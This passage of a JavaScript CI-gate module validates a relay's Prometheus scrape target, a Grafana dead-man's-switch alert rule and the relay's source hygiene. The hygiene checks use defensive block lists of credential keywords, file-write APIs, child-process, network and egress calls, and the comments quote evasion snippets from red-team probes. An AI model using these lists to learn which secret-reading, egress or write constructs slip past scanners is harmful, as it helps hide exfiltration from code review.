    staticItems[0],
    'targets',
    indentOf(staticItems[0][0]),
    `G9o: the \`${RELAY_SERVICE_NAME}\` job's static_configs entry`,
  );
  if (!targetsRes.ok) return fail(targetsRes.detail);
  const targets = flowListItems(targetsRes.value);
  if (targets === null) {
    return fail(
      `G9o: the \`${RELAY_SERVICE_NAME}\` job's \`targets:\` is \`${targetsRes.value}\`, which is ` +
        "not the flow-style list every sibling job uses (`['127.0.0.1:PORT']`) — fail loud rather " +
        'than compare against a partial parse',
    );
  }
  if (targets.length !== 1) {
    return fail(
      `G9o: the \`${RELAY_SERVICE_NAME}\` job declares ${targets.length} targets; exactly 1 is ` +
        'required — a second target is a second, unreviewed process answering for this job',
    );
  }
  const targetParts = targets[0].split(':');
  if (targetParts.length !== 2) {
    return fail(`G9o: the scrape target \`${targets[0]}\` is not <host>:<port>`);
  }
  if (targetParts[0] !== '127.0.0.1') {
    return fail(
      `G9o (OBS-17): the \`${RELAY_SERVICE_NAME}\` scrape target is \`${targets[0]}\`, whose host ` +
        'is not 127.0.0.1 — every process in this stack runs on the host network, loopback-bound',
    );
  }
  const targetPort = toInt(targetParts[1]);
  if (targetPort === null || targetPort !== composePort) {
    return fail(
      `G9o (OBS-46/P3): Prometheus scrapes \`${targets[0]}\` but the relay's own compose block ` +
        `binds \`${listen.value}\` (port ${composePort}). Co-occurrence is not wiring: a job and a ` +
        'service that merely exist in the same repo produce `up=0` forever. NOTE for anyone ' +
        "changing this check: the compose port MUST be read from the relay's scoped service " +
        "block — a file-wide `indexOf('--web.listen-address=')` returns PROMETHEUS's 9090 " +
        '(docker-compose.yml:51 is the first occurrence) and would silently compare the wrong two ' +
        'numbers.',
    );
  }

  return pass(
    `G9o (OBS-46): \`job_name: ${RELAY_SERVICE_NAME}\` resolves inside \`scrape_configs:\` ` +
      `(alongside ${named.length - 1} sibling job(s)), scrapes \`${metricsPath.value}\` on ` +
      `\`${targets[0]}\`, which is the port the relay's own compose \`--web.listen-address\` binds`,
  );
}

// ---------------------------------------------------------------------------
// G9p — the dead-man's switch, asserted as something that can actually FIRE
// ---------------------------------------------------------------------------

/**
 * Every provisioned alert rule, split on its `- uid:` item boundary and carrying
 * its own group's interval.
 *
 * SPLIT ON ITEM BOUNDARIES, NEVER SCAN FORWARD FROM AN `expr:`. In rules.yml
 * `for:` PRECEDES `expr:` inside a rule (`for:` at :43, `expr:` at :58), so a
 * detector that finds AlloyDown by its expr and then searches forward for a
 * `for:` picks up **`10m` from AlloyIngestStalled** (:80) — the next rule down.
 * Every fixture in T-o gives its rules DIFFERENT `for:` values precisely so that
 * bug is visible rather than accidentally harmless.
 */
function parseAlertingRules(alertRulesText) {
  const lines = stripHashComments(alertRulesText).split('\n');
  const roots = [];
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].startsWith('groups:')) roots.push(i);
  }
  if (roots.length !== 1) {
    return fail(`expected exactly one column-0 \`groups:\` key, found ${roots.length}`);
  }
  const groups = listItems(subBlock(lines, roots[0]));
  if (groups.length === 0) return fail('`groups:` declares zero groups — nothing was scanned');

  const rules = [];
  for (const group of groups) {
    const gi = indentOf(group[0]);
    const groupName = scopedScalar(group, 'name', gi, 'an alert group');
    if (!groupName.ok) return groupName;
    const rawInterval = scopedScalar(group, 'interval', gi, `alert group \`${groupName.value}\``);
    if (!rawInterval.ok) return rawInterval;
    const groupInterval = parseDurationSeconds(rawInterval.value);
    if (groupInterval === null || groupInterval === 0) {
      return fail(
        `alert group \`${groupName.value}\` declares \`interval: ${rawInterval.value}\`, which ` +
          'does not parse as a non-zero duration (G12b owns that rule; this gate needs the number)',
      );
    }
    const rulesBlock = scopedBlock(group, 'rules', gi, `alert group \`${groupName.value}\``);
    if (!rulesBlock.ok) return rulesBlock;
    for (const item of listItems(rulesBlock.lines)) {
      const ri = indentOf(item[0]);
      if (!item[0].trim().startsWith('uid:')) {
        return fail(
          `a rule in group \`${groupName.value}\` does not begin with \`uid:\` (it begins ` +
            `\`${item[0].trim().slice(0, 32)}\`) — this gate identifies rules by their \`- uid:\` ` +
            'item boundary, so a different first key makes that mapping ambiguous',
        );
      }
      const uid = scopedScalar(item, 'uid', ri, `a rule in group \`${groupName.value}\``);
      if (!uid.ok) return uid;
      const rule = {
        uid: uid.value,
        lines: item,
        indent: ri,
        groupName: groupName.value,
        groupIntervalSeconds: groupInterval,
        rawFor: null,
        forSeconds: null,
        condition: null,
        isPaused: null,
        severity: null,
        data: [],
        exprs: [],
      };
      const forIdx = keyIndices(item, 'for', ri);
      if (forIdx.length > 1)
        return fail(`rule \`${rule.uid}\` declares ${forIdx.length} \`for:\` keys`);
      if (forIdx.length === 1) {
        rule.rawFor = scalarOf(item[forIdx[0]], 'for');
        rule.forSeconds = parseDurationSeconds(rule.rawFor);
        if (rule.forSeconds === null) {
          return fail(
            `rule \`${rule.uid}\` declares \`for: ${rule.rawFor}\`, which does not parse as a ` +
              "duration. Fail loud: '60s' vs '10m' string-compares WRONG, so this gate parses " +
              'both sides to seconds and never compares the raw text.',
          );
        }
      }
      const condIdx = keyIndices(item, 'condition', ri);
      if (condIdx.length > 1)
        return fail(`rule \`${rule.uid}\` declares ${condIdx.length} \`condition:\` keys`);
      if (condIdx.length === 1) rule.condition = scalarOf(item[condIdx[0]], 'condition');
      const pausedIdx = keyIndices(item, 'isPaused', ri);
      if (pausedIdx.length > 1)
        return fail(`rule \`${rule.uid}\` declares ${pausedIdx.length} \`isPaused:\` keys`);
      if (pausedIdx.length === 1) rule.isPaused = scalarOf(item[pausedIdx[0]], 'isPaused');
      const labelsIdx = keyIndices(item, 'labels', ri);
      if (labelsIdx.length > 1)
        return fail(`rule \`${rule.uid}\` declares ${labelsIdx.length} \`labels:\` blocks`);
      if (labelsIdx.length === 1) {
        const sevIdx = keyIndices(subBlock(item, labelsIdx[0]), 'severity', null);
        if (sevIdx.length === 1) {
          rule.severity = scalarOf(subBlock(item, labelsIdx[0])[sevIdx[0]], 'severity');
        }
      }

      const dataBlock = scopedBlock(item, 'data', ri, `rule \`${rule.uid}\``);
      if (!dataBlock.ok) return dataBlock;
      const entries = listItems(dataBlock.lines);
      if (entries.length === 0) return fail(`rule \`${rule.uid}\` declares zero \`data:\` entries`);
      for (const entry of entries) {
        const di = indentOf(entry[0]);
        const refId = scopedScalar(entry, 'refId', di, `a \`data:\` entry of rule \`${rule.uid}\``);
        if (!refId.ok) return refId;
        // Round 3 (Gap 3, shared with G13c via this SAME parser): a SECOND
        // `data:` entry carrying the SAME refId. Which one a threshold node's
        // `expression:`/`condition:` actually resolves to is
        // implementation-defined, so a duplicate is never valid — measured:
        // adding a second `refId: A` alongside the real one survived every
        // check above (each entry is independently well-formed).
        if (rule.data.some((d) => d.refId === refId.value)) {
          return fail(
            `rule \`${rule.uid}\` declares 2+ \`data:\` entries with \`refId: ${refId.value}\` — ` +
              "which one wins for a threshold node's `expression:` or `condition:` reference is " +
              'implementation-defined, so a duplicate refId is never valid',
          );
        }
        const ds = scopedScalar(
          entry,
          'datasourceUid',
          di,
          `\`data:\` entry \`${refId.value}\` of rule \`${rule.uid}\``,
        );
        if (!ds.ok) return ds;
        const model = scopedBlock(
          entry,
          'model',
          di,
          `\`data:\` entry \`${refId.value}\` of rule \`${rule.uid}\``,
        );
        if (!model.ok) return model;
        const modelIndent = model.lines.length > 0 ? indentOf(model.lines[0]) : di + 2;
        const exprIdx = keyIndices(model.lines, 'expr', modelIndent);
        if (exprIdx.length > 1) {
          return fail(
            `\`data:\` entry \`${refId.value}\` of rule \`${rule.uid}\` declares 2+ \`expr:\` keys`,
          );
        }
        const expr = exprIdx.length === 1 ? scalarOf(model.lines[exprIdx[0]], 'expr') : null;
        if (expr !== null) rule.exprs.push(expr);
        rule.data.push({
          refId: refId.value,
          datasourceUid: ds.value,
          expr,
          modelLines: model.lines,
          modelIndent,
        });
      }
      rules.push(rule);
    }
  }
  if (rules.length === 0) return fail('zero alert rules were parsed — nothing was scanned');
  return { ok: true, rules, detail: `${rules.length} alert rule(s) parsed` };
}

/** The `__expr__` threshold node's shape: node type, evaluator type, params. */
function thresholdShape(entry, uid) {
  const where = `the \`${entry.refId}\` condition node of rule \`${uid}\``;
  const nodeType = scopedScalar(entry.modelLines, 'type', entry.modelIndent, where);
  if (!nodeType.ok) {
    return fail(
      `${nodeType.detail} — a condition node with no model-level \`type:\` is not a threshold, ` +
        'and Grafana will not evaluate it into an alert state',
    );
  }
  const expression = scopedScalar(entry.modelLines, 'expression', entry.modelIndent, where);
  if (!expression.ok) return expression;
  const conditions = scopedBlock(entry.modelLines, 'conditions', entry.modelIndent, where);
  if (!conditions.ok) return conditions;
  const items = listItems(conditions.lines);
  if (items.length !== 1) {
    return fail(`${where} declares ${items.length} \`conditions:\` entries; exactly 1 is required`);
  }
  const evaluator = scopedBlock(items[0], 'evaluator', indentOf(items[0][0]), where);
  if (!evaluator.ok) return evaluator;
  const evalIndent =
    evaluator.lines.length > 0 ? indentOf(evaluator.lines[0]) : indentOf(items[0][0]) + 2;
  const evalType = scopedScalar(evaluator.lines, 'type', evalIndent, `${where}'s evaluator`);
  if (!evalType.ok) return evalType;
  const paramsIdx = keyIndices(evaluator.lines, 'params', evalIndent);
  if (paramsIdx.length !== 1) {
    return fail(`${where}'s evaluator declares ${paramsIdx.length} \`params:\` keys, need 1`);
  }
  const params = scalarListUnder(evaluator.lines, paramsIdx[0]);
  if (!params.ok) return fail(`${where}'s evaluator \`params:\` — ${params.detail}`);
  if (params.values.length === 0) {
    return fail(`${where}'s evaluator declares ZERO params — nothing was compared`);
  }
  return {
    ok: true,
    nodeType: nodeType.value,
    expression: expression.value,
    evaluatorType: evalType.value,
    params: params.values,
  };
}

export function checkRelayDeadMansSwitch(alertRulesText) {
  const parsed = parseAlertingRules(alertRulesText);
  if (!parsed.ok) return fail(`G9p: ${parsed.detail}`);

  const relayRules = parsed.rules.filter((r) => r.exprs.some((e) => e.includes(RELAY_UP_NEEDLE)));
  if (relayRules.length !== 1) {
    return fail(
      `G9p (OBS-46/P4): found ${relayRules.length} alert rules whose \`expr:\` contains ` +
        `\`${RELAY_UP_NEEDLE}\`; exactly 1 is required. This slice lands the service, its scrape ` +
        "target and its dead-man's switch in ONE change: `up` for a target that is never scraped " +
        'is not a signal, and a service with no switch is a process whose death nobody notices ' +
        `(rules parsed: [${parsed.rules.map((r) => r.uid).join(', ')}]).`,
    );
  }
  const relay = relayRules[0];
  if (relay.exprs.some((e) => e.includes(ALLOY_JOB_MATCHER))) {
    return fail(
      `G9p (OBS-46, spec:542-547): rule \`${relay.uid}\` watches BOTH \`${ALLOY_JOB_MATCHER}\` and ` +
        `\`${RELAY_JOB_MATCHER}\` in one expression. The spec calls this out by name as ` +
        "UNBUILDABLE: OBS-39 watches Prometheus's scrape of Alloy's self-metrics endpoint and " +
        'carries no signal about whether the separate mr-trace-relay process is alive — Alloy ' +
        'keeps running fine when the relay dies. A single `or`-widened rule fires for either ' +
        'process and names neither, so the operator cannot act on it. OBS-46 requires a DISTINCT ' +
        'rule on a DISTINCT target.',
    );
  }

  const alloyRules = parsed.rules.filter(
    (r) => r !== relay && r.exprs.some((e) => e.includes(ALLOY_UP_NEEDLE)),
  );
  if (alloyRules.length !== 1) {
    return fail(
      `G9p: found ${alloyRules.length} alert rules whose \`expr:\` watches \`${ALLOY_UP_NEEDLE}\` ` +
        "and nothing else; exactly 1 (OBS-39's AlloyDown) is required. This gate DERIVES every " +
        'number it compares — the pending period, the datasource, the threshold direction, the ' +
        'severity — from that rule in this same document rather than re-spelling `60s`, `lt` and ' +
        '`1` here, so without it there is nothing to derive from.',
    );
  }
  const alloy = alloyRules[0];
  if (relay.uid === alloy.uid) {
    return fail(
      `G9p (OBS-46): the relay rule and AlloyDown share the uid \`${relay.uid}\`. Grafana keys ` +
        'provisioned rules by uid, so the second one silently REPLACES the first and the stack ' +
        'ends up with one rule where the operator reads two.',
    );
  }

  if (relay.isPaused !== null && relay.isPaused !== 'false') {
    return fail(
      `G9p (OBS-46): rule \`${relay.uid}\` declares \`isPaused: ${relay.isPaused}\`. A paused rule ` +
        'is provisioned, visible in the UI, and NEVER evaluated — every other clause in this gate ' +
        "stays green while the dead-man's switch is switched off.",
    );
  }

  if (relay.forSeconds === null || alloy.forSeconds === null) {
    return fail(
      `G9p: rule \`${relay.forSeconds === null ? relay.uid : alloy.uid}\` declares no \`for:\` — ` +
        "OBS-46's threshold is defined by reference to OBS-39's, so both sides must state one",
    );
  }
  if (relay.forSeconds !== alloy.forSeconds) {
    return fail(
      `G9p (OBS-46): rule \`${relay.uid}\` declares \`for: ${relay.rawFor}\` (${relay.forSeconds}s) ` +
        `while \`${alloy.uid}\` declares \`for: ${alloy.rawFor}\` (${alloy.forSeconds}s). This is ` +
        "an EQUALITY check, not a lower bound: under a `>=` comparison a `for: 24h` dead-man's " +
        'switch passes while being useless. The expected value is never re-spelled here — it is ' +
        'READ from AlloyDown in this same document. If you are debugging this check rather than ' +
        "the config: `for:` PRECEDES `expr:` inside a rule, so scanning forward from AlloyDown's " +
        "expr finds AlloyIngestStalled's `10m`; and `'60s' < '10m'` string-compares wrong, so " +
        'both sides are parsed to seconds.',
    );
  }
  if (relay.groupIntervalSeconds > alloy.groupIntervalSeconds) {
    return fail(
      `G9p (OBS-46): the relay rule sits in group \`${relay.groupName}\` (interval ` +
        `${relay.groupIntervalSeconds}s), which is COARSER than AlloyDown's group ` +
        `\`${alloy.groupName}\` (${alloy.groupIntervalSeconds}s). Grafana transitions alert state ` +
        'only on an evaluation boundary, so a coarser interval silently stretches the effective ' +
        'pending period past the `for:` both rules agree on.',
    );
  }
  if (relay.severity === null || relay.severity !== alloy.severity) {
    return fail(
      `G9p (AM19): rule \`${relay.uid}\` declares \`severity: ${relay.severity ?? '(none)'}\`, ` +
        `expected AlloyDown's \`${alloy.severity ?? '(none)'}\`. Severity is not decoration here: ` +
        'notification-policies.yml:8-9 routes on it, so a relay rule without the mirrored label ' +
        'silently takes the catch-all 4h repeat interval instead of the 1h one its sibling gets.',
    );
  }

  const relayExprEntry = relay.data.find(
    (d) => d.expr !== null && d.expr.includes(RELAY_UP_NEEDLE),
  );
  const alloyExprEntry = alloy.data.find(
    (d) => d.expr !== null && d.expr.includes(ALLOY_UP_NEEDLE),
  );
  if (relayExprEntry === undefined || alloyExprEntry === undefined) {
    return fail('G9p: the query entry carrying the `up{...}` expr could not be resolved');
  }
  if (relayExprEntry.datasourceUid !== alloyExprEntry.datasourceUid) {
    return fail(
      `G9p (OBS-46): the relay rule queries datasource \`${relayExprEntry.datasourceUid}\` while ` +
        `AlloyDown queries \`${alloyExprEntry.datasourceUid}\`. \`up\` is a PROMETHEUS series: ` +
        'pointed at any other datasource the query returns no data forever, which Grafana renders ' +
        'as "No Data" rather than as an alert — a switch that cannot fire.',
    );
  }

  for (const [rule, label] of [
    [relay, 'the relay rule'],
    [alloy, `AlloyDown (\`${alloy.uid}\`)`],
  ]) {
    if (rule.condition === null) {
      return fail(`G9p: ${label} declares no \`condition:\` — Grafana would evaluate nothing`);
    }
    if (rule.data.find((d) => d.refId === rule.condition) === undefined) {
      return fail(
        `G9p (OBS-46): ${label} names \`condition: ${rule.condition}\` but no \`data:\` entry ` +
          `declares that refId (declared: [${rule.data.map((d) => d.refId).join(', ')}]). A ` +
          'DANGLING condition refId is the quietest failure in this file: the expr is right, the ' +
          'threshold node is right, and the rule never fires.',
      );
    }
  }
  const relayNode = relay.data.find((d) => d.refId === relay.condition);
  const alloyNode = alloy.data.find((d) => d.refId === alloy.condition);
  const relayShape = thresholdShape(relayNode, relay.uid);
  if (!relayShape.ok) return fail(`G9p: ${relayShape.detail}`);
  const alloyShape = thresholdShape(alloyNode, alloy.uid);
  if (!alloyShape.ok) {
    return fail(
      `G9p: ${alloyShape.detail}. This gate derives the relay's expected threshold shape from ` +
        'AlloyDown, so an unreadable AlloyDown is a fail-loud, never a skipped comparison.',
    );
  }
  if (alloyShape.expression !== alloyExprEntry.refId) {
    return fail(
      `G9p: AlloyDown's condition node thresholds refId \`${alloyShape.expression}\`, which is not ` +
        `the refId carrying its own \`up\` expr (\`${alloyExprEntry.refId}\`) — the rule this gate ` +
        'derives from is itself mis-wired; fix OBS-39 first',
    );
  }
  if (relayShape.expression !== relayExprEntry.refId) {
    return fail(
      `G9p (OBS-46): the relay rule's condition node thresholds refId ` +
        `\`${relayShape.expression}\`, but the entry carrying \`${RELAY_UP_NEEDLE}\` is refId ` +
        `\`${relayExprEntry.refId}\`. The threshold is applied to a DIFFERENT query than the one ` +
        'that watches the relay, so the switch watches something else entirely.',
    );
  }
  if (relayShape.nodeType !== alloyShape.nodeType) {
    return fail(
      `G9p (OBS-46): the relay rule's condition node is \`type: ${relayShape.nodeType}\`, expected ` +
        `AlloyDown's \`${alloyShape.nodeType}\` — read from that rule, not re-spelled here`,
    );
  }
  if (relayShape.evaluatorType !== alloyShape.evaluatorType) {
    return fail(
      `G9p (OBS-46): the relay rule's evaluator is \`type: ${relayShape.evaluatorType}\`, expected ` +
        `AlloyDown's \`${alloyShape.evaluatorType}\`. Direction is the whole switch: \`up\` is 1 ` +
        'when the target is healthy, so a `gt 1` evaluator NEVER fires and a `gt 0` evaluator ' +
        'fires while the relay is FINE. The expr, the uid, the for: and the datasource all stay ' +
        'correct through that mutation.',
    );
  }
  if (relayShape.params.join(',') !== alloyShape.params.join(',')) {
    return fail(
      `G9p (OBS-46): the relay rule's evaluator params are [${relayShape.params.join(', ')}], ` +
        `expected AlloyDown's [${alloyShape.params.join(', ')}] — read from that rule, not ` +
        're-spelled here',
    );
  }
  if (relayNode.datasourceUid !== alloyNode.datasourceUid) {
    return fail(
      `G9p: the relay rule's condition node runs on datasource \`${relayNode.datasourceUid}\`, ` +
        `expected AlloyDown's \`${alloyNode.datasourceUid}\` (server-side expressions evaluate ` +
        'under the `__expr__` pseudo-datasource; anything else is not a server-side threshold)',
    );
  }

  return pass(
    `G9p (OBS-46): \`${relay.uid}\` watches ${RELAY_UP_NEEDLE} only, is not paused, thresholds ` +
      `refId ${relayShape.expression} with a ${relayShape.nodeType}/${relayShape.evaluatorType} ` +
      `[${relayShape.params.join(', ')}] node on \`${relayNode.datasourceUid}\`, and mirrors ` +
      `\`${alloy.uid}\` on for: ${relay.rawFor}, severity ${relay.severity} and datasource ` +
      `${relayExprEntry.datasourceUid} — every one of those DERIVED from that rule in the same ` +
      `document (group interval ${relay.groupIntervalSeconds}s <= ${alloy.groupIntervalSeconds}s)`,
  );
}

// ===========================================================================
// G9i/G9j — relay source hygiene
// ===========================================================================

/**
 * The CODE of a source file: whole-line comments dropped, and trailing `//`
 * comments cut QUOTE-AWARELY (the checks module's `stripComments` idiom, ported
 * from `#` to `//`). Without the quote tracking a legitimate comment naming a
 * banned token would false-positive; without cutting trailing comments at all,
 * a banned token could hide behind `const x = 1; // setTimeout(` and read as
 * code. Lowercased so every needle below can be written in lower case.
 */
function codeLines(source) {
  const out = [];
  for (const line of source.split('\n')) {
    const trimmed = line.trimStart();
    if (trimmed.startsWith('//') || trimmed.startsWith('/*') || trimmed.startsWith('*')) {
      continue;
    }
    let quote = '';
    let escaped = false;
    let cut = -1;
    for (let i = 0; i < line.length; i++) {
      const ch = line[i];
      if (quote) {
        if (escaped) escaped = false;
        else if (ch === '\\') escaped = true;
        else if (ch === quote) quote = '';
        continue;
      }
      if (ch === '"' || ch === "'" || ch === '`') {
        quote = ch;
        continue;
      }
      if (ch === '/' && line[i + 1] === '/') {
        cut = i;
        break;
      }
    }
    out.push((cut === -1 ? line : line.slice(0, cut)).toLowerCase());
  }
  return out;
}

/**
 * OBS-45 static half, SUBSTRING needles. Prose ABOUT credentials belongs in
 * comments (which `codeLines` strips); a credential surface in CODE is banned.
 */
const CREDENTIAL_SURFACE = [
  '--token',
  '--auth',
  '--password',
  '--api-key',
  '--credential',
  'authorization',
  'bearer ',
  'password',
  'secret',
  'apikey',
  'api_key',
  'x-api-key',
  'x-auth',
];

/**
 * OBS-45, WORD-SEGMENT needles. A bare substring `token` would fire on
 * `tokenize` and `nextToken(` — both of which a hand-rolled parser (which is
 * exactly what the relay is) may legitimately want. So the needle must be its
 * own identifier SEGMENT: no ASCII letter on either side. Underscores, dots,
 * dashes and quotes are all boundaries, which is what matters —
 * `process.env.SESSION_TOKEN`, `.token`, `token:` and `'token'` all fire, while
 * `tokenize`/`tokenizer`/`nextToken` stay clean. Accepted residual, stated
 * rather than hidden: a run-together `authtoken` is missed; the `--token`,
 * `authorization`, `bearer ` and `x-api-key` substrings above cover the shapes
 * a real credential read actually takes.
 */
const CREDENTIAL_WORDS = ['token'];

function containsCredentialWord(line, word) {
  const isLetter = (c) => c !== undefined && c >= 'a' && c <= 'z';
  let at = line.indexOf(word);
  while (at !== -1) {
    if (!isLetter(line[at - 1]) && !isLetter(line[at + word.length])) return true;
    at = line.indexOf(word, at + word.length);
  }
  return false;
}

/**
 * Write-shaped fs APIs NO relay file may reach for (OBS-45).
 *
 * CONTRACT CONSEQUENCE, stated so it is a decision and not an accident: BOTH
 * shells write their OTLP document to STDOUT ONLY — there is no `--out` flag on
 * the batch CLI and none on the daemon. Allowing one blessed `writeFileSync` for
 * `--out` is what let a red-team probe plant `writeFileSync('/tmp/x', 'x')` in
 * the shell and stay silent. A relay that never writes at all is the only
 * version of OBS-45 a static scan can actually prove, and `> file` covers every
 * use `--out` would have had. It also settles D2: there is no offset checkpoint
 * file, ever — offsets live in memory only, and the accepted, stated cost is
 * that breadcrumbs written while the relay was down are never exported.
 *
 * 13r-b (AM7) — the eight needles below the original fourteen were added after a
 * cheat daemon was WRITTEN and RUN through the proposed gates: it persisted its
 * offsets with `await open(p, 'a').write(doc)` and copied the log tree with
 * `cpSync('/logs', '/tmp/x', { recursive: true })` and scanned GREEN, because
 * the list held `opensync` but not `open(`, and no `cpsync` at all. Promise-API
 * and bulk-copy shapes are the two families the sync-suffixed names miss.
 */
const WRITE_APIS = [
  'writefilesync',
  'writefile',
  'appendfilesync',
  'appendfile',
  'copyfilesync',
  'copyfile',
  'createwritestream',
  'opensync',
  'unlinksync',
  'rmsync',
  'renamesync',
  'mkdirsync',
  'chmodsync',
  'truncatesync',
  // AM7, each PoC'd or in the same family as one that was:
  'open(',
  'promises.open',
  'cpsync',
  'mkdtempsync',
  'writesync',
  'symlinksync',
  'linksync',
  'utimessync',
];

/**
 * AM16(a) — the two literals no relay production file may spell in CODE.
 *
 * `0.0.0.0` forces the endpoint through configuration instead of a wildcard bind
 * that would make C6/OBS-17's loopback rule a statement about the compose file
 * only. `://` is the remote-Semgrep raw-URL surface: `--config auto` matches
 * scheme literals in RAW TEXT, so it has red-ed this repo on a websocket scheme
 * sitting inside a COMMENT (which is why the needle is never written next to a
 * scheme name anywhere in this file, only bare). Local `just ci` runs no
 * Semgrep, so the round trip costs a squash onto a fresh branch after the push
 * — force-push is hook-blocked. Both literals are cheap for
 * the relay to obey: it takes its listen address from `--web.listen-address` and
 * has no outbound URL at all (see the P5-otlp-export park).
 */
const NETWORK_LITERAL_BANS = ['0.0.0.0', '://'];

/**
 * The read APIs a relay SHELL file must positively use. A shell that reads
 * nothing cannot be confirmed to read READ-ONLY.
 *
 * AM15: `createreadstream` is here because `daemon.mjs` IMPORTS `collectLogFiles`
 * and `loadTracePairSet` from the batch CLI rather than re-implementing them
 * (single source of truth for the 4-stage "absence is NOT the empty set"
 * contract), so it may legitimately contain neither `readfilesync` nor
 * `readdirsync` — `createReadStream(path, {start, end})` is its real read API.
 * `fs.openSync` is not an option: `opensync` is a banned WRITE_API (D3).
 */
const RELAY_READ_APIS = ['readfilesync', 'readdirsync', 'createreadstream'];

// ---------------------------------------------------------------------------
// G9j — the THREE hygiene ban tiers (AM8)
//
// AM12's mechanical ban list kept the /health server and the tail-follow daemon
// out of m20e entirely. 13r-b LANDS both, and the wrong move here — the one that
// keeps `just ci` green while turning the live gate vacuous — is to relax the
// list globally. It is RETIERED instead, and one ban is KEPT that the naive
// retier would have dropped:
//
//   PURE tier  (RELAY_PURE_FILES + their tests + the batch CLI) — all 8, as
//              before. `tail.mjs` is a state machine over plain data; if it can
//              reach a clock, a timer or a socket it is not a pure core.
//   DAEMON tier (daemon.mjs ONLY) — relaxes `node:http`, `.listen(` and exactly
//              ONE of `setinterval(`/`settimeout(`. `date.now(` STAYS BANNED
//              (AM16(b)): nothing in the daemon reads wall-clock time — pairing
//              uses the host-populated `ts` (OBS-43), cadence uses the timer, and
//              /health's counter is a monotonic count — so cutting the `now` seam
//              lets the retier KEEP a ban instead of relaxing it. Gains the
//              EGRESS ban below (the P5 tripwire).
//   DAEMON-TEST tier (daemon.test.mjs ONLY) — ALL 8, unrelaxed. It drives
//              INJECTED transports and needs none of the relaxations. This is
//              what mechanically forces the injected seam rather than trusting
//              the author to build one, and it is what stops a real listener on
//              a fixed port appearing under `node --test`'s parallel execution
//              (this repo has a recorded global-lock flake class from exactly
//              that shape).
//
// The dynamic-regexp needle is assembled from fragments so that no CODE line of
// this file spells the constructor contiguously; the remote Semgrep gate matches
// raw text as well as AST, and this repo has been red-ed by it 3x.
// ---------------------------------------------------------------------------
const HYGIENE_BANS = [
  `new reg${'exp('}`,
  'node:child_process',
  'node:http',
  'node:net',
  '.listen(',
  'setinterval(',
  'settimeout(',
  'date.now(',
];

/** The ONLY needles the daemon tier drops, each justified in the block above. */
const DAEMON_RELAXED_BANS = ['node:http', '.listen(', 'setinterval(', 'settimeout('];

/** Exactly one of these may appear in daemon.mjs, exactly once (AM16(b)). */
const DAEMON_TIMER_CALLS = ['setinterval(', 'settimeout('];

/**
 * THE P5 TRIPWIRE (AM6). The OTLP POST client is deferred to the P5-otlp-export follow-up slice, so the
 * daemon has ZERO egress — which makes this a FLAT ban rather than a
 * conditional "egress must be to an allowed host" rule, i.e. both stronger and
 * smaller than the alternative. The moment an outbound POST lands in daemon.mjs
 * without the `PARKED — P5-otlp-export` block being graduated, G9j reds here.
 */
const DAEMON_EGRESS_BANS = ['fetch(', '.request(', '.connect(', 'node:https', 'node:net', 'undici'];

const DAEMON_BANS = [
  ...new Set([
    ...HYGIENE_BANS.filter((ban) => !DAEMON_RELAXED_BANS.includes(ban)),
    ...DAEMON_EGRESS_BANS,
  ]),
];

/**
 * Every relay `.mjs` must resolve to EXACTLY ONE tier.
 *
 * A filename-keyed tier map fails OPEN for a file in neither list — it simply
 * gets no bans applied — and these lists are HAND-EDITED, so "we will remember
 * to add it" is the failure mode, not a hypothetical. Exactly-one also catches
 * the opposite hand-edit: a file added to two tiers would silently take
 * whichever the lookup found first.
 */
const RELAY_BAN_TIERS = [
  {
    id: 'pure',
    files: [...RELAY_PURE_FILES, ...RELAY_PURE_TEST_FILES, RELAY_BATCH_CLI_FILE],
    bans: HYGIENE_BANS,
  },
  { id: 'daemon', files: [RELAY_DAEMON_FILE], bans: DAEMON_BANS },
  { id: 'daemon-test', files: [RELAY_DAEMON_TEST_FILE], bans: HYGIENE_BANS },
];

/**
 * G9j — the tiered ban scan. `files` is `[{ name, source }]`, where `name` is
 * the path RELATIVE TO relay/ (so a `.mjs` smuggled into `relay/fixtures/`
 * arrives as `fixtures/x.mjs`, resolves to zero tiers, and reds).
 */
export function checkRelayBanTiers(files) {
  if (!Array.isArray(files) || files.length === 0) {
    return fail(
      'G9j: ZERO relay .mjs files were handed to the ban scan — a scan of nothing passes ' +
        'everything, and an absent relay is not a clean one',
    );
  }
  const problems = [];
  const classified = [];
  for (const file of files) {
    const tiers = RELAY_BAN_TIERS.filter((tier) => tier.files.includes(file.name));
    if (tiers.length !== 1) {
      problems.push(
        `G9j (AM8): ${RELAY_REL}/${file.name} resolves to ${tiers.length} ban tiers ` +
          `[${tiers.map((t) => t.id).join(', ') || 'none'}]; exactly 1 is required. A ` +
          'filename-keyed tier map FAILS OPEN for an unclassified file — it would simply have no ' +
          'bans applied — and these lists are hand-edited. Add the file to exactly one of ' +
          `[${RELAY_BAN_TIERS.map((t) => t.id).join(', ')}] in the same change that creates it, ` +
          'or delete it.',
      );
      continue;
    }
    const tier = tiers[0];
    const lines = codeLines(file.source);
    for (const ban of tier.bans) {
      if (!lines.some((line) => line.includes(ban))) continue;
      const isEgress = DAEMON_EGRESS_BANS.includes(ban);
      problems.push(
        `G9j (AM8): ${RELAY_REL}/${file.name} is in the ${tier.id.toUpperCase()} tier and ` +
          `contains a banned construct (${ban}).` +
          (isEgress
            ? ' This is the P5 TRIPWIRE: the OTLP POST client is PARKED to the P5-otlp-export follow-up slice (see this ' +
              "file's header), so the daemon has ZERO egress and this ban is flat. If an " +
              'outbound POST is genuinely landing, GRADUATE the park — add the transport as an ' +
              'injected seam with its outgoing header key set asserted exactly, relax only the ' +
              'needle you need with a written reason, and delete the park block in the SAME ' +
              'change. Do not widen the list to make a POST fit.'
            : tier.id === 'daemon'
              ? ' The DAEMON tier relaxes exactly ' +
                `[${DAEMON_RELAXED_BANS.join(', ')}] and nothing else — this needle is not among ` +
                'them, and relaxing it further is how this gate goes vacuous while CI stays green.'
              : ` The ${tier.id.toUpperCase()} tier keeps all ${HYGIENE_BANS.length} bans. If ` +
                'this file genuinely needs a runtime capability, it belongs in the daemon, not ' +
                'here — moving the ban is not the fix.'),
      );
    }
    if (tier.id === 'daemon') {
      let timerSites = 0;
      for (const line of lines) {
        for (const call of DAEMON_TIMER_CALLS) timerSites += countOccurrences(line, call);
      }
      if (timerSites !== 1) {
        problems.push(
          `G9j (AM16(b)): ${RELAY_REL}/${file.name} contains ${timerSites} timer call sites ` +
            `(${DAEMON_TIMER_CALLS.join(' / ')}); exactly 1 is required. ZERO means the poll loop ` +
            'does not exist or hides behind an unreviewed construct; TWO means a second, ' +
